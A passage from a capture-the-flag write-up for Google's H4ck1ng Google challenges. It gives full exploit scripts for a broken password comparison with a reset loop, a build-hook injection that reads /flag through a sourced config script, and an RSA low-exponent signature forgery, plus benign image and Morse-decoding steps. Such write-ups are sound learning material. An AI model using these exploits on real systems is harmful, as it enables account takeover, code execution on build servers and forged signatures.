< https://h4ck1ng.google/solve/**REDACTED**
<
-----
>
=====
```

### CHALLENGE 02

> You are the researcher. Follow the hints, find a vulnerability in the platform.
>
> Hint: Try logging in as tin

We are given a NodeJS app. As it turns out, this is the same app used in challenge 1, which is available at [https://vrp-website-web.h4ck.ctfcompetition.com](https://vrp-website-web.h4ck.ctfcompetition.com).

#### Solution

The theme for this challenge is bug hunting. So, let's find some bugs.

In `services/users.js` I found the hashed passwords for `don`, who seems to be an admin, and `tin`.

```javascript
const users = [
  { username: 'don', hashedPassword: 'i4tUa+RTGgv+jRtyUWBXbP1i/mg=', isAdmin: true },
  { username: 'tin', hashedPassword: 'XtBEoWAkAF/UKax1SDdIHeCJbtE=' }
]
```

Given the hint, at first, I thought this was about brute forcing `tin`'s account and then, somehow, "escalate" to `don`… But I wasn't certain that the hardcoded passwords were the same used in the online instance of the app, and the application has a "password reset" service, so I kept searching for bugs.

`safeEqual()` functions caught my attention. Finding custom functions doing work that it's readily available in core (or popular) libraries is always a red flag. And, in fact, here it is our bug in its majestic splendour!

```javascript
function safeEqual(a, b) {
    let match = true;

    if (a.length !== b.length) {
        match = false;
    }

    const l = a.length;
    for (let i = 0; i < l; i++) {
        match &&= a.indexOf(i) === b.indexOf(i);
    }

    return match;
}
```

Can you see it? Yeah: `a.indexOf(i) === b.indexOf(i)` is (strictly) comparing indexes instead of characters.

This function is used to compare the base64 encoded SHA1 hashes of the password entered by the user, with the hardcoded one.

```javascript
async function getUserByUsernameAndPassword (username, password) {
  const user = await getUserByUsername(username)
  if (!user) return undefined

  const hashedPassword = crypto.createHash('sha1').update(password).digest('base64')
  if (!safeEqual(user.hashedPassword, hashedPassword)) return undefined
  
  return user
}
```

How can we exploit this?

Base64 alphabet does include ASCII digits so, to get a `true` from `safeEqual` we need to provide a password that, when hashed and encoded either:

1. has all the digits in the same position as the hardcoded password;
2. doesn't have any digit, AND also the stored `b64(sha1(password))` doesn't have any digit.

Number 1 looked quite hard, while 2. definitely more viable. This also thanks to the password reset feature for the user `tin`.

So, the strategy is: find a password whose `b64(sha1(password))` doesn't contain any number, reset `tin`'s password and try to authenticate until we can log in.

Here is the exploit I wrote:

```python
#!/usr/bin/env python3
import base64
import hashlib
import itertools
import re
import requests
import sys


HOME_URL = "https://vrp-website-web.h4ck.ctfcompetition.com/"
P_RES_URL = f"{HOME_URL}reset-password"
LOGIN_URL = f"{HOME_URL}login"
USERNAME = "tin"


def b64sha1(word):
    digest = hashlib.sha1(word.encode('utf-8')).digest()
    return str(base64.b64encode(digest))


# Find a password p that doesn't generate a b64(sha1(p)) containing digits
alphabet = tuple('acdefghjkmnpqrtuvwxyz0123456789')
for length in range(2, 5):
    for pword_l in itertools.product(alphabet, repeat=length):
        pword = ''.join(pword_l)
        b64 = b64sha1(pword)
        if all(not ch.isdigit() for ch in b64):
            print(f"using password '{pword}' (hash: {b64})")
            break
    else:
        continue
    break

s = requests.Session()
# Reset the password for tin, until we can log in
while True:
    r = s.post(LOGIN_URL, data={"username": USERNAME,
                                "password": pword})
    if r.status_code == 200 and "Incorrect credentials" not in r.text:
        # Bingo
        print()
        break
    print(".", end='')
    sys.stdout.flush()
    r = s.post(P_RES_URL, data={"username": USERNAME})
    if r.status_code != 200 or "Password for tin is resetted" not in r.text:
        print(f"Something went wrong resetting the password for '{USERNAME}'")

r = s.get(HOME_URL)
if r.status_code == 200:
    flag = re.search(r'(https://h4ck1ng\.google/solve/[0-9a-z_-]*)',
                     r.text)
    if flag is not None:
        print(flag.group(1))
        sys.exit(0)

print("Something went wrong :(")
sys.exit(1)
```

And we can get our flag:

```shell
❯ ./exploit.py
using password '**REDACTED**' (hash: b'zNjBWTgIHKVvhWRBUSKrADRwqDM=')
.........
https://h4ck1ng.google/solve/**REDACTED**
```

### CHALLENGE 03

> The VRP platform is proudly open-source, and encourages submissions. Let's try to change something and see if we can find some bugs.
>
> Hint: Look around the site to find out how to contribute.

There is no link for this challenge.

#### Solution

It took me quite a while to realize what I should do for this challenge. Looking back at the source code for the bug bounty website, I noticed a NodeJS route for `/contributing` page.

Unfortunately, we cannot access that page on the online instance, as we can't log in as an admin (i.e., `don`), but we can browse our local instance!

In the `contributing` view, we found the following message:

```shell
[...]
First, clone the Git repo for this project:

$ git clone git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo  
$ git checkout -b my-feature

After you make your changes, push them up to create a Pull Request:

$ git push

You will get back a link to your proposal where a member of the team will review your changes for conformance and make any comments.
[...]
```

I cloned the repo, which contains the source code for challenge 01 (duh! It would have make my life sooo easier back to that challenge…). I made a small change, and pushed:

```shell
❯ git clone git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
Cloning into 'vrp_repo'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 7 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (7/7), done.
❯ cd vrp_repo
❯ touch gimmetheflag
❯ git add .
❯ git commit -a -m "my contribute"
[main 12d7019] my contribute
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 gimmetheflag
❯ git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 10 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 933 bytes | 933.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: Skipping presubmit (enable via push option)
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] main -> main (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

A pre-receive git hook is blocking our valuable contribution. Obviously, we need to bypass it. But, what is a git hook?

> Hooks are programs you can place in a hooks directory to trigger actions at certain points in git's execution.

Hooks are typically used to protect your Git repository from mistakes, automate manual processes, gather data about git activity, and much more. Some hooks are executed on the client, but others are run on the remote endpoint (like in our case).

Reading carefully what the remote end is telling us, there is also a presubmit "hook" that has been skipped? Now, while the pre-receive hook is quite popular, I have never heard about a pre-submit one… so `presubmit` must be part of the pre-receive hook handler.

Apparently, we can enable this presubmit thing via push option:

```shell
❯ git push --push-option=presubmit
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 10 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 933 bytes | 933.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at 12d7019 my contribute
remote: Building version v0.1.1
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] main -> main (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

Nice 🙂 the server is telling us that it executed `build.sh`, failing on line 5 as the go executable couldn't be found. This is the script it is referring to:

```shell
1. #!/usr/bin/env bash
2. 
3. source configure_flags.sh &>/dev/null
4. echo "Building version ${VERSION}"
5. go build -ldflags="${LDFLAGS[*]}"
6.
```

Too good to be true? Unfortunately, yes: I tried to put some commands in `build.sh` but I soon realized that it's the "previous" version of the script to be executed, not the one being pushed :(

BUT, the script interacts with pushed code, and, in particular, it sources `configure_flags.sh`!

After a few iterations, I edited `configure_flags.sh` as follows:

```shell
#!/usr/bin/env bash

# IMPORTANT: Make sure to bump this before pushing a new binary.
VERSION="v0.1.1-$(cat /flag)"
COMMIT_HASH="$(git rev-parse --short HEAD)"
BUILD_TIMESTAMP=$(date '+%Y-%m-%dT%H:%M:%S')

LDFLAGS=(
  "-X 'main.Version=${VERSION}'"
  "-X 'main.CommitHash=${COMMIT_HASH}'"
  "-X 'main.BuildTime=${BUILD_TIMESTAMP}'"
)
```

Pushed this change, and got the flag:

```shell
❯ git push --push-option=presubmit
Enumerating objects: 6, done.
Counting objects: 100% (6/6), done.
Delta compression using up to 10 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (4/4), 1019 bytes | 1019.00 KiB/s, done.
Total 4 (delta 2), reused 0 (delta 0), pack-reused 0
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at c60a73b my contribute
remote: Building version v0.1.1-https://h4ck1ng.google/solve/**REDACTED**
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] main -> main (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

## EP005 - Project Zero

Zero-day vulnerabilities are vulnerabilities that are known to attackers before defender learned about it.

Google Project Zero aims to find those vulnerabilities before the bad guys do!

### CHALLENGE 01

> Piece together the images to get a clearer picture.
>
> Hint: I wonder if those toys from the 90's are still alive.

You are given a mysterious `challenge.bin` file.

#### Solution

The bin file doesn't have any obvious signature, and it is a sparse file.

The hint seems to suggest that this file is something related to toys from the 90s… if you watched the intro video, it looks pretty obvious that it's related to [Tamagotchi](https://en.wikipedia.org/wiki/Tamagotchi).

Searching the internet, I found a Tamagotchi P1 emulator which looked promising: [TamaTool](https://github.com/jcrona/tamatool). At first, I thought that the image was a ROM, but I abandoned that lead as:

- it didn't work out-of-the-box with the emulator;
- wrt the "original" ROM (available, for instance, [here](https://www.planetemu.net/rom/mame-roms/tama)), our file is too small and sparse;
- Tamagotchi's ROMs are protected by copyright, so Google couldn't realistically hack and redistribute one (also writing one from scratch looked pretty overkill by me).

While playing with the TamaTool, I noticed that it can extract images from the ROM. That, together with the challenge hint, was a strong indication I was dealing with an image file.

It took me more than 1 day to understand how to decode this image (image formats are not my cup of tea)… I started playing with ImageMagick (the convert tool, specifically) but I couldn't find much...

Then my frustration made me use the brute force. I built a Python script, using Pillow, to iterate over some image sizes (width and height). I was pretty sure I was dealing with a B/W image (since Tamagotchi has a monochromatic display), which means one bit per pixel.

Brute-force kind-of worked, not giving me a perfect picture, but something with clear, recognizable, patterns. I could read part of the flag, and that gave me a huge hint on the file format: as it turns out, the image uses 2 bits per pixel!

I still couldn't get a perfect picture, but this is the exploit I used to read the whole flag.

```python
#!/usr/bin/env python3

from PIL import Image


def grouped(iterable, n):
    return zip(*[iter(iterable)] * n)


file = open("./challenge.bin", "rb")
rawData = file.read()
file.close()

newData = []
for byte in rawData[4:]:
    bits = [int(i) for i in "{0:08b}".format(byte)]
    for b1, b2 in grouped(bits, 2):
        newData.append(b1 << 7 | b2 << 6)
mode = 'L'
img = Image.frombytes(mode, (48, 230), bytes(newData), 'raw')
img.save(f"out.png")
```

### CHALLENGE 02

Note: this is the best challenge of the series. My absolute favourite :)

> Get the jump on your enemies in this side scrolling game. [https://pzero-adventures-web.h4ck.ctfcompetition.com/](https://pzero-adventures-web.h4ck.ctfcompetition.com/)
>
> Hint: Can you score lower than zero?

The URL brings you to a nice horizontal scrolling jumping game. The game has some sort of persistent high scores table.

The challenge also has a link to the source code of the game, which is written in JS (front end) and Python/Flask (API).

#### Solution

You can't "win" this game just playing, of course. The point of the challenge is to submit (somehow) a negative score and get the flag. The source code agrees with that statement :)

```python
if score < 0:
        # FIX(mystiz): I heard that some players are so strong that the score is overflown.
        #              I'll send them the flag and hope the players are satisfied for now...
        return {"message": f"You performed so well so that you triggered an integer overflow! This is your flag: {FLAG}"}
```

The API endpoint to submit scores is `/api/highscores`, if we use a POST request. The problem is that this endpoint verifies a signature that must be submitted along with the score:

```python
try:
        verify(KEY_ID, name, score, signature)
    except Exception as err:
        return json_response(400, text=err)
```

Looking at the browser behaviour, I could see that the game issues first an API call to `/api/sign` with a POST. This provides a signature that it's later used to submit the score to `/api/highscores`.

Now the problem is that while we can trick `/api/highscores` to accept a negative score, `/api/sign` handler has a check for that :(

```python
if type(score) != int or score < 0:
        return json_response(400, text="invalid score")
```

Looking at the source, the signature is a "homemade" RSA signature. And for "homemade" I mean this:

```python
s = pow(encryption_block, self.d, self.n)
```

If there is one thing I learned in security, it's that you should never ever write your own crypto stuff. Cryptography is hard, and even experts can make mistakes. So, that definitely raised a flag.

I also found that the public key is available at the `/api/keys` endpoint, so I carefully inspected the algorithms used for signing and verifying the message. Unfortunately, nothing obvious came up on RSA usage.

But, while doing the maths, I noticed that the exponent used for the public key was 3 (i.e., $e=3$). Some time ago, for my job, I had to [deal with RSA "internals"](https://dguerri.github.io/random-tech-stuff/RSA%20Signatures%20with%20TPM2.0/) a bit, so I remembered that $e=3$ wasn't considered safe.

More investigation made me realize that using a low exponent is not in general a mistake, but it can lead to issues under certain circumstances. I fired up some automated tool to identify known weakness on the key, but no joy.

Then, I started to focus on signature forgery (as opposed to private key "derivation" I was attempting before) and I came across this [great post from Filippo Valsorda](https://words.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/) about [CVE-2016-1494](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-1494).

The article talks about a variant of "Bleichenbacher'06 attack against RSA signature verification with low public exponent". It is not directly applicable to our case, but the maths in it is great to solve our challenge.

The high-level concepts of this exploit are related to the maths behind RSA (refer to the article linked above for a great, clear, explanation):

- An RSA signature for a message $m$ is calculated as $c = m^d \bmod{N}$;
- An RSA signature on $m$ is verified with $c^e \bmod{N} = m$;
- We can trick the receiver into accepting the message $c$, if:
  - we have some degree of control on the signed message;
  - $e$ is small, so it likely won't cause the $\bmod{N}$ part to be involved during verification;
  - the receiver is not performing an accurate verification on all parts of the message (e.g., the padding).

How? By submitting a signature calculated as $m'^{\frac{1}{e}} \bmod{N}$. **_Under our assumptions_**, this signature will be verified as:

$${(m'^{\frac{1}{e}})}^e \bmod{N} = m'^{\frac{1}{e}e} \bmod{N} = m'$$

We don't need to know $p$, $q$ or $d$.

So, we need to craft $m'$ in a way that it will make sense for the receiver, raise it to the $\frac{1}{e}$ power and then calculate it's $\bmod{N}$. The problem is that we are only approximating the real signature (the original $d$ is not $\frac{1}{e}$) so we need something to conceal the approximation error.

Do we have that something in our case?

It took me some time to find it, but yeah, we do. This is the code that creates the message to be signed:

```python
digest_algorithm_identifier = DerSequence([
            DerObjectId('2.16.840.1.101.3.4.2.1').encode(),
            DerNull().encode()
        ])
        digest = hashlib.sha256(m).digest()

        digest_info = DerSequence(([
            digest_algorithm_identifier,
            DerOctetString(digest).encode()
        ]))
```

ASN.1 is hard because it's a complicated (description) language: you can define nested structures, like sequences of sequences. Our target application does a decent job in validating the received message (after decryption with public key), but it misses checking extra stuff in the `digest_algorithm_identifier` sequence:

```python
sequence = DerSequence()
        sequence.decode(digest_info)
        _digest_algorithm_identifier, _digest = sequence

        sequence = DerSequence()
        sequence.decode(_digest_algorithm_identifier)
        _digest_algorithm_identifier = sequence[0]     # <- HERE

        object_id = DerObjectId()
        object_id.decode(_digest_algorithm_identifier)
        digest_algorithm_identifier = object_id.value
        if digest_algorithm_identifier != '2.16.840.1.101.3.4.2.1':
            raise Exception('invalid digest algorithm identifier')
```

We can "smuggle" extra rubbish in that sequence, after the digest algorithm ID and the actual digest.

The article linked above explains how we can separate the to-be-signed message into a prefix, some rubbish, and a suffix. We can treat prefix and suffix separately and push the approximation error of the prefix exponentiation into the rubbish.

This is the exploit I came up with after some iteration:

```python
#!/usr/bin/env python3

from Crypto.PublicKey import RSA
from Crypto.Util.asn1 import DerNull, DerInteger
from Crypto.Util.asn1 import DerSequence, DerObjectId, DerOctetString
from gmpy2 import mpz, iroot
import hashlib
import json
import sys
import requests


URL = "https://pzero-adventures-web.h4ck.ctfcompetition.com/api/highscores"


# --Ripped from the target application
class VerifyingKey:
    def __init__(self, n, e, bits=2048):
        self.n = n
        self.e = e

        self.bits = bits

    # https://datatracker.ietf.org/doc/html/rfc2313#section-10.2
    # Note: The only hash algorithm we accept is SHA256.
    def verify(self, m, s):
        if len(s) != self.bits // 8:
            raise Exception('incorrect signature length')
        s = int.from_bytes(s, 'big')

        k = pow(s, self.e, self.n)
        k = int.to_bytes(k, self.bits // 8, 'big')
        if k[0] != 0x00:
            raise Exception('incorrect prefix')
        if k[1] != 0x01:
            raise Exception('incorrect prefix')

        padding, digest_info = k[2:].split(b'\x00', 1)

        if len(padding) < 8:
            raise Exception('invalid padding length')
        if padding != b'\xff' * len(padding):
            raise Exception('invalid padding content')

        sequence = DerSequence()
        sequence.decode(digest_info)
        _digest_algorithm_identifier, _digest = sequence

        sequence = DerSequence()
        sequence.decode(_digest_algorithm_identifier)
        _digest_algorithm_identifier = sequence[0]

        object_id = DerObjectId()
        object_id.decode(_digest_algorithm_identifier)
        digest_algorithm_identifier = object_id.value
        if digest_algorithm_identifier != '2.16.840.1.101.3.4.2.1':
            raise Exception('invalid digest algorithm identifier')

        _null = sequence[1]
        null = DerNull()
        null.decode(_null)

        octet_string = DerOctetString()
        octet_string.decode(_digest)
        digest = octet_string.payload

        if hashlib.sha256(m).digest() != digest:
            raise Exception('mismatch digest')
        return True
# --Ripped from the target application--


def to_bytes(n):
    """ Return a bytes representation of a int """
    return n.to_bytes((n.bit_length() // 8) + 1, byteorder='big')


def from_bytes(b):
    """ Makes a int from a bytestring """
    return int.from_bytes(b, byteorder='big')


def get_bit(n, b):
    """ Returns the b-th rightmost bit of n """
    return ((1 << b) & n) >> b


def set_bit(n, b, x):
    """ Returns n with the b-th rightmost bit set to x """
    if x == 0:
        return ~(1 << b) & n
    if x == 1:
        return (1 << b) | n


KEY_ID = "pzero-adventures"
KEY_BITS = 2048
SCORE = -2
PLAYER_NAME = "abc"

with open(f'./{KEY_ID}.pub') as f:
    key_bytes = f.read()

key = RSA.import_key(key_bytes)
if key.e != 3:
    print(f"e is not 3 (e={key.e}), good luck with that...")
    sys.exit(1)

low_score = json.dumps([KEY_ID, PLAYER_NAME, SCORE]).encode()
digest = hashlib.sha256(low_score).digest()

# The message we are signing will be:
# 00 01 ff ff ff ff ff ff ff ff 00
#   ASN.1-SEQ [
#       ASN.1-SEQ [
#           "2.16.840.1.101.3.4.2.1", 0x00, GARBAGE
#       ],
#       digest
#   ]

# 67 is the len in bytes of DER encoded sequences with:
#  - padding (11 bytes)
#  - sequence of sequence (3081f2 3081cd  = 6 bytes)
#  - alg id (11 bytes)
#  - null byte (2 bytes)
#  - tag for our garbage octect string (0481xx - 3 bytes)
#  - the digest (34 bytes)
garbage_bytes = KEY_BITS // 8 - 67

digest_algorithm_identifier = DerSequence([
    DerObjectId('2.16.840.1.101.3.4.2.1'),
    DerNull(),
    DerOctetString(b'\x88' * garbage_bytes)  # Garbage
])

digest_info = DerSequence(([
    digest_algorithm_identifier,
    DerOctetString(digest),
]))

encryption_block = bytes.fromhex('00')
encryption_block += bytes.fromhex('01')
encryption_block += b'\xff' * 8
encryption_block += bytes.fromhex('00')
padding_length = len(encryption_block)
encryption_block += digest_info.encode()

suffix_len = len(DerOctetString(digest).encode())
suffix = encryption_block[(len(encryption_block) - suffix_len):]

prefix_len = 2048 // 8 - suffix_len
prefix = encryption_block[:prefix_len]

if suffix[-1] & 0x01 != 1:
    print("Sorry, this exploit only work if suffix is odd.")
    print("tweak your score or name to get an odd hash")
    sys.exit(1)

print("-m' prefix----")
print(prefix.hex())

print("-m' suffix----")
print(suffix.hex())


# Generate a fake "signature" for the suffix, pushing the approximation
# error we will get on exponentiation (i.e., verification), bit by bit,
# to the left
sig_suffix = 1
for bit in range(len(suffix) * 8):
    if get_bit(sig_suffix ** key.e, bit) != get_bit(from_bytes(suffix), bit):
        sig_suffix = set_bit(sig_suffix, bit, 1)

# Check that the exponentiation of the fake signature actually ends with
# the cleartext message
if not to_bytes(sig_suffix ** key.e).endswith(suffix):
    print("Something went wrong! Couldn't produce a valid fake signature")

# Prefix is easy
sig_prefix = encryption_block[:prefix_len] + b'\x00' * (2048 // 8 - prefix_len)
sig_prefix = int(iroot(mpz(from_bytes(sig_prefix)), key.e)[0])

# Compose the final fake sgnarure, concatenating sig_suffix and sig_prefix
fake_sig = to_bytes(sig_prefix)[:-len(suffix)] + b'\x00' * len(suffix)
fake_sig = fake_sig[:-len(suffix)] + to_bytes(sig_suffix)
fake_sig = int.to_bytes(from_bytes(fake_sig), 2048 // 8, 'big')

vk = VerifyingKey(key.n, key.e)
try:
    if not vk.verify(low_score, fake_sig):
        raise Exception("verification failed")
except Exception as e:
    print(f"Something went wrong, the signaure is not valid: {e}")
    sys.exit(1)

message = {
    "name": PLAYER_NAME,
    "score": SCORE,
    "signature": fake_sig.hex()
}
r = requests.post(URL, json=message)
print(r.text)
```

And got the (super rewarding) flag!

```shell
❯ ./exploit.py
-m' prefix----
0001ffffffffffffffff003081f23081cd060960864801650304020105000481bd888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
-m' suffix----
04205f34d0787a58b12152d229b30dbe062bbc538ddde2895361c6f7586ec89fd567
{"message":"You performed so well so that you triggered an integer overflow! This is your flag: https://h4ck1ng.google/solve/**REDACTED**"}
```

### CHALLENGE 03

> Look back at all the episodes and piece together a secret message.
>
> Hint: This code isn't data but it could have prevented Aurora. Introductions are important.

This is all we get for the last challenge!

#### Solution

I must admit that without some help on Discord, I probably wouldn't be able to solve this one (thanks `anton_` for helping me without spoiling it!). I watched all the videos several times, finding no hidden "message"…

As it turned out, I should have listened more than watched… and with a good headset. My age also didn't help as my hearing is pretty bad :(

So, the message is Morse code, "hidden" right before the first person's introduction of each episode.

When I finally heard it, I downloaded each episode's audio tract, and with FFmpeg, I isolated ~6 seconds of each chunk, also filtering out everything but the frequency range used to transmit the code.

I could find the approximate frequency, after few iterations, thanks to this website: [https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

```shell
# EP000

❯ ffmpeg -i ep000.mp3 -ss 00:02:50 -t 00:00:6 -acodec mp3 \
    -filter:a "highpass=f=4000, lowpass=f=6000" ep000b.mp3

# EP001

❯ ffmpeg -i ep001.mp3 -ss 00:02:17 -t 00:00:6 -acodec mp3 \
    -filter:a "highpass=f=4000, lowpass=f=6000" ep001b.mp3

# EP002

❯ ffmpeg -i ep002.mp3 -ss 00:01:30 -t 00:00:6 -acodec mp3 \
    -filter:a "highpass=f=4000, lowpass=f=6000" ep002b.mp3  

# EP003

❯ ffmpeg -i ep003.mp3 -ss 00:02:13 -t 00:00:6 -acodec mp3 \
    -filter:a "highpass=f=4000, lowpass=f=6000" ep003b.mp3

# EP004

❯ ffmpeg -i ep004.mp3 -ss 00:03:20 -t 00:00:6 -acodec mp3 \
    -filter:a "highpass=f=4000, lowpass=f=6000" ep004b.mp3

# EP005

❯ ffmpeg -i ep005.mp3 -ss 00:02:24 -t 00:00:6 -acodec mp3 \
    -filter:a "highpass=f=4000, lowpass=f=6000" ep005b.mp3
```

I then uploaded each chunk to [https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html), and retrieve the message. Note that it's necessary to lower the volume threshold a bit.

Done, right?

Nope… as it turned out, there is some sort of bug: the second and third episode has the same code. You can find a thread on Discord about it.

I had to use a bit of imagination to guess the right chunk: it's basically the slogan of h4ck1ng G00gl3…

GG

EOF